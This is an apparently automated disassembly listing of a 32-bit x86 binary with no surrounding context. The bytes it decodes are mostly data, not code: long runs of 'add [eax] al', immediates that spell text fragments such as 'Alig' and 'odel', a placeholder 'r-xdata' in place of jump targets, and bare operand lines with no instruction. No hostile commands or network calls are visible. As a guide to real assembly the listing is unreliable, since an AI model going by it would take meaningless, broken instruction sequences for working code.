add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add [ esi + edx + 0x44 ] al
add [ eax ] al
daa
pushad
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xe0004203
outsd
insd
sbb [ eax + eax - 0x24 ] al
jb r-xdata
cwde
mov bl 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
inc esp
add [ ecx ] al
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_43687f
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
add ah bl
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
loopne r-xdata
je r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
les esi [ ebx + eax * 2 + 0x6100 ]
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ eax + 0x3 ] al
or eax 0x6e410700
add bh bh
in al 0x65
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add [ ebp + ebp * 4 + 0x5b0043 ] bl
add bh bh
fdivr st0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
nop
ja r-xdata
add [ eax ] eax
add [ ecx + 0x3480043 ] dl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x27ffbfcc ] ch
pop ss
add [ eax ] al
add ah al
and eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x90004323
inc ebx
add [ eax - 0x37 ] ah
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
loopne r-xdata
outsd
je r-xdata
inc edx
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] al
add [ 0x72440800 ] dl
imul ebp [ esi + 0x74 ] 0x43ad8473
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
jb r-xdata
add [ ecx + eax ] ch
jmp esp
loopne r-xdata
inc ebx
je r-xdata
inc esp
add [ eax + 0xc004408 ] bl
or [ eax + eax - 0x80 ] eax
stc
inc ebx
add ah ch
or [ eax + eax - 0x4 ] al
arpl [ ebx ] ax
js r-xdata
add [ edi ] ah
add [ eax ] al
clc
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
inc ebx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
add [ eax + 0xc004408 ] bl
or [ eax + eax - 0x80 ] eax
stc
inc ebx
add ah ch
or [ eax + eax - 0x4 ] al
arpl [ ebx ] ax
js r-xdata
add [ edi ] ah
add [ eax ] al
clc
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add al ah
inc ebx
popad
inc ebx
add [ eax + 0x13 ] cl
inc esp
add [ ebx + edx + 0x44 ] al
add [ esp + edx ] dl
inc esp
add [ eax ] cl
test [ ebx ] sub_43fe4c
mov al 0xfd
inc ebx
add al bl
push es
inc esp
add [ eax - 0xa ] dl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ eax ] al
inc bx
add ah cl
test [ ebx ] sub_440320
cwde
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add [ esi + edx + 0x44 ] al
add [ eax ] al
daa
add [ edx ] al
inc eax
add [ edx ] al
push 0xe0004203
insb
[ eax ]
jae r-xdata
add bh bh
sub [ esi + 0x43 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
outsd
insb
mov esp 0x68004216
add [ eax ] al
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov ah 0x43
add [ ebx - 0x64010000 ] bl
sub_43238a
inc esp
add [ eax - 0x53ffbbfe ] bl
add eax 0x4580044
inc esp
add [ esi + edx + 0x44 ] al
add [ eax ] al
daa
inc esp
add [ eax + 0xc004408 ] bl
or [ eax + eax - 0x80 ] eax
stc
inc ebx
add ah ch
or [ eax + eax - 0x4 ] al
arpl [ ebx ] ax
js r-xdata
add [ eax + eax ] cl
inc ebx
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
les esp [ ebx ]
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
and al 0x23
inc ebx
add [ eax + 0x32004322 ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax + 0x4405 ] al
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
arpl [ eax + 0x6f ] bp
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
cwde
mov bl 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
inc esp
add [ ecx ] al
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_43687f
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
les esi [ ebx + eax * 2 + 0x6100 ]
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ eax + 0x3 ] al
or eax 0x6e410700
add bh bh
in al 0x65
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add [ ebp + ebp * 4 + 0x5b0043 ] bl
add bh bh
fdivr st0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
nop
ja r-xdata
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] al
add [ 0x72440800 ] dl
imul ebp [ esi + 0x74 ] 0x43ad8473
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
jb r-xdata
add [ ecx + eax ] ch
jmp esp
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax ]
jae r-xdata
add bh bh
sub [ esi + 0x43 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
outsd
insb
mov esp 0x68004216
add [ eax ] al
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov ah 0x43
add [ ebx - 0x64010000 ] bl
sub_43276e
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
mov esp 0x80043b8
push eax
outsd
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
sub [ bp + 0x43 ] dh
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
xor [ ecx ] 0x0
jb r-xdata
mov al [ 0xffffffffd80043b6 ]
add [ eax ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
or ecx [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push ebp
jo r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
add [ eax ] dh
sub eax [ ebx ]
jb r-xdata
je r-xdata
jns r-xdata
jl r-xdata
jns r-xdata
popad
inc esp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
and [ edx ] al
add [ eax ] al
nop
inc esp
jb r-xdata
push ebx
je r-xdata
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebx
je r-xdata
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edi + ecx * 2 ] cl
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
add [ eax + 0x4f0b002b ] al
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
jo r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add al dl
push 0x6b0c0043
inc ebx
add al cl
push 0x43
add [ esp + ebp * 2 + 0x43 ] dh
add [ ebx + ebp * 2 ] bh
inc ebx
add ah ch
push 0x43
add [ eax - 0x27ffbc95 ] ah
imul eax [ ebx ] 0x8
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
cmp al 0x70
inc ebx
add [ eax + esi * 2 + 0x43 ] bh
add al bh
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add al dh
push 0xf7cc0043
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] dl
insd
inc ebx
add ah cl
insd
inc ebx
add [ esi + ebp * 2 ] bh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax - 0x1fffbbc1 ] ah
outsb
inc ebx
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add ah ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
sub al [ ebx ]
push ds
sub eax [ ebx ]
jo r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
inc ebp
outsb
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
popad
jbe r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
push eax
mov ebp 0x1300043
mov bh 0x43
je r-xdata
add [ eax - 0x27ffbc90 ] dh
jo r-xdata
arpl [ ebp + 0x70 ] dx
jo r-xdata
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x28004203
jb r-xdata
mov eax eax
add al 0x2a
inc ebx
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
cld
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add [ ecx + ebp + 0x43 ] ch
add [ eax ] cl
jl r-xdata
cld
insb
jae r-xdata
inc eax
add [ ecx + eax + 0x6e18ff00 ] ah
add [ ecx + esi * 2 ] dh
inc ebx
add [ ecx + esi * 2 + 0x43 ] ch
add al ah
outsd
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
cld
inc ecx
add [ eax + 0x4004034 ] ch
jo r-xdata
popad
jae r-xdata
add ah bl
jb r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add al dh
push 0xf7cc0043
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] dl
insd
inc ebx
add ah cl
insd
inc ebx
add [ esi + ebp * 2 ] bh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax - 0x1fffbbc1 ] ah
outsb
inc ebx
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x28004203
push 0x72100043
inc esp
add [ edi + esi * 2 ] ch
add [ eax ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
outsb
jae r-xdata
sub eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x2c
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2000432c ] ch
add al [ eax ]
add [ eax + 0x48004329 ] bh
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
inc ebx
add [ eax ] ah
je r-xdata
les eax [ ebx ]
popad
jae r-xdata
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
add [ eax ] eax
add [ eax ] al
add [ edx ] al
push 0x72100043
inc esp
add [ edi + esi * 2 ] ch
inc esp
add [ eax + edi * 8 + 0x2ba00043 ] dl
inc esp
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc ecx
add [ eax ] cl
push ebx
je r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add al dl
push 0x6b0c0043
inc ebx
add al cl
push 0x43
add [ esp + ebp * 2 + 0x43 ] dh
add [ ebx + ebp * 2 ] bh
inc ebx
add ah ch
push 0x43
add [ eax - 0x27ffbc95 ] ah
imul eax [ ebx ] 0x5
push esp
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add eax 0x69644554
je r-xdata
add [ eax + 0x4004034 ] ch
jo r-xdata
outsd
insd
inc ebp
imul esi [ fs : esp + eax + 0x2a ] 0xc8440043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
jbe r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
test al 0x2c
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
inc esp
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax ] ch
insb
jae r-xdata
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebx
jge r-xdata
in al dx
je r-xdata
sub eax [ ebx ]
sub al 0x2b
inc ebx
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
rol [ edx + ebp ] 0x43
retn
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
cmp al 0x79
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add ah al
mov ah 0x43
add [ ecx ] ah
add bh bh
sbb bh dh
inc ebx
add [ edi + esi * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
retn
outsb
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
clc
js r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
jae r-xdata
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
jb r-xdata
outsb
jb r-xdata
retn
add bh bh
clc
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x24ff0001 ] ah
insd
inc esp
add [ eax + 0x6d ] cl
inc esp
test [ ebp + 0x7a0043 ] ch
sbb al 0x12
inc edx
add [ eax ] dh
inc ebx
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
add [ eax ] al
push [ eax ]
js r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
inc [ ecx + ebp * 2 ]
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
push esp
inc ebp
add [ edx + eax ] cl
add bh bh
add al 0x69
insb
dec ecx
add [ gs : eax ] dl
add bh bh
jpe r-xdata
xor eax [ esp + eax * 4 - 0x53 ]
inc ebx
add [ edx ] bh
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
push ebx
add [ edi ] bl
add bh bh
jo r-xdata
jae r-xdata
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
insb
sub [ ebx ] eax
adc eax [ edx ]
add bh bh
sub [ ecx + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add dh bh
call sub_4371e2
add [ eax ] al
add [ eax ] 0x0
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
cmp al 0x69
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
pushfd
retn 0x43
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov ah 0x43
sub_432d75
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
push esp
inc ebp
add [ edx + eax ] cl
add bh bh
add al 0x69
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ecx
outsb
or eax [ ebx + 0x6f ]
jb r-xdata
outsb
jb r-xdata
retn
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x24ff0001 ] ah
insd
inc esp
add [ eax + 0x6d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
insb
sub [ ebx ] eax
adc eax [ edx ]
add bh bh
sub [ ecx + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ esp + eax * 4 - 0x53 ]
inc ebx
add [ edx ] bh
popad
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
jpe r-xdata
inc esp
test [ ebp + 0x7a0043 ] ch
sbb al 0x12
inc edx
add [ eax ] dh
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
jae r-xdata
inc ebx
outsd
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
